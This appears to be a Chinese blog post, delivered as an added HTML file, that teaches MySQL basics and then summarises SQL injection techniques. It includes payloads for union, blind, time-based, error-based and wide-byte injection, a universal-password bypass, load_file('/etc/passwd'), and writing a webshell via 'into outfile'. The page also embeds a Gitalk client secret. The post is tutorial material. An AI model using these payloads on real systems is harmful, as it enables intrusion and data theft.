@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>Mysql数据库学习 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="Mysql数据库学习 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="Mysql数据库学习"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/31yLuqlo-/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>Mysql数据库学习</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-02，12 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p><strong>数据库类型</strong><br>
+数据库类型有关系型数据库和非关系型数据库</p>
+<!-- more -->
+<p>1.关系型数据库</p>
+<pre><code>采用了关系模型来组织数据的数据库，用行和列来储存属于，方便用户理解，行和列组成表，一个或多个表组成数据库。用户通过sql语句来查询数据。
+优点：容易理解，sql语句操作方便，易于维护，能进行复杂查询
+缺点：高并发的时候，硬盘遭不住。如果查询大量数据，效率很低，固定的表结构，灵活度稍欠
+常见的关系型数据库有:Oracle,DB2,Mysql,Mssql,access
+</code></pre>
+<p><strong>2.非关系型数据库</strong></p>
+<pre><code>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。以键值对储存，结构不固定，每一个元组可以有不一样的字段，每个元组可以根据需要增加键值对。
+优点：格式灵活，可以是key,value、文档格式、图片形式等，使用灵活
+      速度快，高扩展，成本低，部署简单
+缺点：不支持sql语句，学习和使用成本高，没有事务处理，适合储存简单数据，对于复杂查询的数据。略显乏力
+</code></pre>
+<p><strong>Mysql数据库</strong><br>
+安装Mysql数据库在这就不讲了。搜索引擎上多的是<br>
+首先看看mysql的命令</p>
+<pre><code>登陆Mysql
+mysql -h 192.168.47.134 -u root -proot
+#连接192.168.47.134的Mysql，用户root，密码root
+#-h 要连接的主机       192.168.47.134
+#-u 登陆的用户名       root 
+#-p 用户名的密码       root
+#如果登陆本地的Mysql，可以不指定-h
+tips:Mysql语句结束要加个;号，表示语句结束，不然就会一直连接下去
+</code></pre>
+<pre><code>Mysql设置密码：
+set password=password('新密码');
+#对当前登陆用户设置密码
+set password for 用户名@地址=password('新密码');
+#指定用户设置密码
+#此实验中。为了方便，就改了弱口令。生产环境中。务必使用强口令
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577950324008.png" alt="" loading="lazy"></figure>
+<pre><code>忘记密码：
+启动Mysql服务时，加参数启动
+mysqld_safe --skip-grant-tables --skip-networking
+--skip-grant-tables 跳过密码验证
+--skip-networking   禁止对外开放服务(关闭TCP/IP连接，只允许本地)
+</code></pre>
+<pre><code>查看数据库:
+show databases;
+#有三个数据库,information_schema,mysql,test
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577950345431.png" alt="" loading="lazy"><br>
+information_schema数据库是信息数据库，注意，这个数据库只有5.0版本以上有,保存着Mysql服务器所有其他数据库的信息，如数据库名，数据库内的表，表内的字段类型，权限，等等<br>
+在Sql注入中，可以利用这个表，来获取数据库中有哪些数据库，表，表内字段，值<br>
+常用表：</p>
+<pre><code>character_sets，提供Mysql字符集信息
+schemata，提供所有数据库名
+tables，提供所有表名
+columns，提供所有字段
+user_privileges，提供用户权限信息
+schema_privileges，提供数据库权限信息
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577950359352.png" alt="" loading="lazy"><br>
+Mysql数据库是mysql的核心数据库，类似于mssql的master表，负责存储数据库用户名密码、权限设置、等信息<br>
+<img src="https://guokeya.github.io/post-images/1577950368251.png" alt="" loading="lazy"></p>
+<pre><code>创建数据库:
+create database 数据库名;
+删除数据库:
+drop database 数据库名;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1577950386103.png" alt="" loading="lazy"></figure>
+<pre><code>查看数据库内的表(首先要选择一个数据库，才能查看里面的表)
+选择数据库:
+use 数据库名;
+查看表:
+show tables;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://guokeya.github.io/post-images/1577950405591.png" alt="" loading="lazy"></figure>
+<pre><code>查看表内数据:
+select * from 表名;
+select * from 表名 limit 0,1
+limit 语句是控制返回行数的，当查询返回数据量过多，就可以用limit语句来控制返回几行，比如limit 0,1返回第一行，limit 1,1，返回第二行
+在sql注入中，有时只返回一行数据，那就可以用limit来一行行输出
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://guokeya.github.io/post-images/1577950417112.png" alt="" loading="lazy"></figure>
+<pre><code>创建表:
+create table aaa(id int(5) primary key auto_increment,name varchar(10) not null ,sex varchar(20) not null);
+创建aaa表，包含三个字段名称，id、name、sex，id 值为数字类型(最大5个字节)，自增长，name值为字符型(最大10个字节) 不能为空，sex值为字符型(最大10个字节) 不能为空
+desc 表名;
+用来看数据表结构
+删除表:
+drop table 表名;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://guokeya.github.io/post-images/1577950429263.png" alt="" loading="lazy"></figure>
+<pre><code>插入数据:
+insert into 表名 (字段) values(对应字段的值)
+insert into 	 (id,name,sex) values(1,'test','shaoxing')
+删除数据:
+delete from 表名
+删除表中所有数据
+delete from 表名where name='test';
+删除XX表中名字为test的数据	
+where用来做过滤(一个表中有多条数据，用where语句来过滤其他数据)
+更新数据:
+有时候不要删除数据，表中某个字段的值需要改变
+update 表名 set 字段='某个内容'					将某个字段内的所有数据全部更改
+update 表名 set 字段='某个内容' where name='某个内容';		更改符合条件的数据
+刷新权限:
+flush privileges;
+当更改了配置时，需要刷新下权限，才会生效
+创建mysql用户:
+可以用insert into语句向mysql.user表内插入新的用户信息
+create user '用户名'@'username的地点' identified by '密码'
+查看用户:
+可以用select 语句查看
+select host,user from user;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://guokeya.github.io/post-images/1577950448087.png" alt="" loading="lazy"></figure>
+<pre><code>删除用户:
+delete from user where user='用户名';
+drop user '用户名'@'登陆地点'
+授权用户:
+给新建的用户授予数据库操作权限
+grant 权限 on 数据库.数据表 to '用户名'@'登陆地点' identified by '密码';
+删除权限:
+revoke 权限 on 数据库.数据包 from '用户'@'登陆地点';
+查看权限:
+show grants;		查看当前用户权限
+show grants for 'web'@'localhost';	查看web这个用户的权限
+flush privileges;       刷新权限
+insert  增加表纪录的权限
+update  修改表纪录的权限
+select  查询表纪录的全信啊
+drop    删除权限
+delete  删除表的权限
+create  创建权限
+。。。
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://guokeya.github.io/post-images/1577950467626.png" alt="" loading="lazy"></figure>
+<pre><code>备份数据表
+select * from 数据表名 into outfile '路径';
+#路径必须有可写权限
+load data local infile '路径' into table 表名;
+#报错the Used command is not allowed with this Mysql version
+set global local_infile='ON'
+#启用模块即可
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://guokeya.github.io/post-images/1577950535997.png" alt="" loading="lazy"></figure>
+<pre><code>备份数据库;
+mysqldump -u 用户名 -p密码 数据库名&gt;路径
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://guokeya.github.io/post-images/1577950554481.png" alt="" loading="lazy"></figure>
+<pre><code>还原数据库
+mysql -u 用户名 -p密码 &lt;/tmp/mysql.sql
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577950567843.png" alt="" loading="lazy"><br>
+<strong>Mysql常用函数/sql语句</strong><br>
+version(),database(),@@datadir,@@version_compile_os,user()<br>
+#数据库版本，当前数据库名，数据库路径，操作系统版本，当前数据库用户<br>
+<img src="https://guokeya.github.io/post-images/1577950578829.png" alt="" loading="lazy"></p>
+<p>Mysql注释符后的字符，将被忽略</p>
+<pre><code>--空格
+#
+/**/
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577950601106.png" alt="" loading="lazy"><br>
+内联sql<br>
+/！select version()/<br>
+#里面的sql语句将被执行</p>
+<p><img src="https://guokeya.github.io/post-images/1577950609356.png" alt="" loading="lazy"><br>
+hex('123')<br>
+#转换为十六进制</p>
+<p>union select 1,2,version()<br>
+#联合查询，这个在sql注入中经常会使用,字段数要和前一个查询一样<br>
+<img src="https://guokeya.github.io/post-images/1577950619077.png" alt="" loading="lazy"><br>
+load_file('/etc/passwd')<br>
+#读取文件，权限够大，读取任意文件，可用来读取敏感文件获取信息</p>
+<p>length('123')<br>
+#返回字符串长度,3</p>
+<p>sleep(3)<br>
+#延时三秒钟</p>
+<p>if(判断，True执行的语句，False执行的语句)<br>
+if(length(database())&gt;3,sleep(4),1);<br>
+#判断数据库名长度是否大于3，大于三就延时4秒，否则返回1</p>
+<p>and &amp;&amp;<br>
+#逻辑运算，和，条件都满足，select * from aaa where id=1 &amp;&amp; 1=1<br>
+#select * from aaa where id=1，返回True，并且1=1返回True，True and True，正常返回<br>
+#常用在判断是否存在sql注入，1=1只是为了让它返回True，2+1=4-1同样可以<br>
+#bypass安全狗，and 1=1就可以利用这个原理绕过</p>
+<p><img src="https://guokeya.github.io/post-images/1577950635474.png" alt="" loading="lazy"><br>
+or ||<br>
+#逻辑运算，或，条件满足其中一个就行，select * from aaa where id=0 || 1=1<br>
+#select password from user where username=0 or 1=1，会返回所有数据<br>
+#mysql_fetch_assoc($sql)!=0.即可绕过</p>
+<p><img src="https://guokeya.github.io/post-images/1577950648823.png" alt="" loading="lazy"><br>
+substr('123',1,1)<br>
+substring('123',1,1)<br>
+mid('123',1,1)<br>
+#截取字符串，返回123字符串中第一位开始，截取一位<br>
+#substr被过滤，就可以用substring 函数</p>
+<p>ascii('A')<br>
+ord('A')<br>
+#返回A的ascii码。常见于sql盲注</p>
+<p>concat(0x7e,(select version()),0x7e);<br>
+group_concat(0x7e,(select version()),0x7e);<br>
+#字符串连接<br>
+<img src="https://guokeya.github.io/post-images/1577950657513.png" alt="" loading="lazy"></p>
+<p>updatexml(xml对象名称,要xpath格式化的字符串,替换的值)<br>
+#updatexml(1,concat(0x7e,(select version()),0x7e),1)<br>
+#由于中间查询出来的5.1.71-log不能转化为xpath字符串，就会报错，这种sql注入类型是报错注入<br>
+<img src="https://guokeya.github.io/post-images/1577950668794.png" alt="" loading="lazy"><br>
+extractvalue(xml文档，xml路径)<br>
+#extractvalue(1,concat(0x7e,(select version()),0x7e))<br>
+#报错注入</p>
+<p>limit 0,1<br>
+#数据太多，自定返回数据量，limit 0，1 返回查询结果的第一行，limit 1，1返回查询结果第二行</p>
+<p>select '' into outfile '/var/www/html/1.php';<br>
+#导出''为文件1.php,可以导出一句话木马，导出目录要有写权限<br>
+<img src="https://guokeya.github.io/post-images/1577950679276.png" alt="" loading="lazy"></p>
+<p>文末总结下sql注入的几种方式<br>
+sql注入的本质，是用户输入的恶意代码和sql语句拼接执行</p>
+<pre><code>union注入：
+select * from aaa where id=1 and union select 1,2,database();
+
+盲注:
+select * from aaa where id=1 and substr((select database()),1,1)=a
+#截取当前数据库名第一位判断是否为a，由于前面的查询返回值，True，后面的判断正确，那么True和True，就会返回正确，相反，如果后面if判断为False，既数据库名第一位不为a，那么True和False，返回False，不会返回数据
+
+#以上是直接用字符去一个个匹配，下面用二分法匹配，将数据库名第一位字符，转换为ascii码
+select * from aaa where id=1 and ascii(substr((select database()),1,1))&gt;110
+#返回True，加大ascii
+select * from aaa where id=1 and ascii(substr((select database()),1,1))&gt;120
+#返回False，减小ascii码
+select * from aaa where id=1 and ascii(substr((select database()),1,1))&gt;115
+#返回True，加大ascii，但不大于120
+select * from aaa where id=1 and ascii(substr((select database()),1,1))&gt;116
+#返回False，115&lt;值!&lt;116,值==116，ascii解码一下，数据库第一位就是t
+
+时间盲注:
+同上面一样，只不过，用sleep函数来验证返回True还是False
+select * from aaa where id=1 and if(ascii(substr((select database()),1,1))&gt;115,sleep(2),1);
+True，就会调用sleep(2)，延时两秒，利用python，判断请求是否延时了两秒，来写脚本
+
+报错注入：
+利用xpath格式转换报错，得到数据
+select * from aaa where id=1 and extractvalue(1,concat(0x7e,(select version()),0x7e));
+
+limit注入：
+注入点在limit语句，limit 关键字后面还有 PROCEDURE 和 INTO 关键字，into 关键字可以用来写文件，这里的重点是 PROCEDURE 关键字.MySQL默认可用的存储过程只有 ANALYSE (doc)。
+select * from aaa limit 0,1 procedure analyse(updatexml(1,concat(0x7e,(select version()),0x7e),1),1);
+
+二次注入：
+用户输入'--&gt;addslashes处理--&gt;\'转义--&gt;存入数据库--&gt;123'--&gt;再从数据库中读取--&gt;select * from name='123''--&gt;二次注入
+
+反引号注入：
+在一道CTF题中，
+desc `secret_$name`,如果desc执行失败，就直接die()
+然后$name带入sql语句执行，select 'flag{xxx}' from secret_{$name};
+首先我们可以构造` `union select version()，闭合前面的反引号，剩下的一个反引号和后面闭合
+然后带入SQL语句就变成了
+select 'flag(xxx)' from secret_test` `union select version()#
+成功在sql语句后面闭合了反引号，并且带入了我们的sql语句
+
+宽字节注入：
+注入原理，php编码为UTF-8，Mysql编码设置gbk，会引发编码转换从而导致注入，比如
+输入%df'--&gt;addslashes处理--&gt;%df%5c%27--&gt;GBK--&gt;%df%5c%27=運%27,单引号就逃逸了，造成注入
+select * from aaa where id='運' union select 1,2,version()#'
+
+万能密码：
+select * from user where username='' and password=''
+select * from user where username='admin' or 1=1#' and password=''
+#注释掉了条件password
+
+这里只是列举了几种最常见的，关于sql注入还有很多骚操作和脑洞
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/_zGR5BbA_/">
+              <span class="post-title">
+                首届360杯网络安全职业技能大赛 流量分析题（一）writeup&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
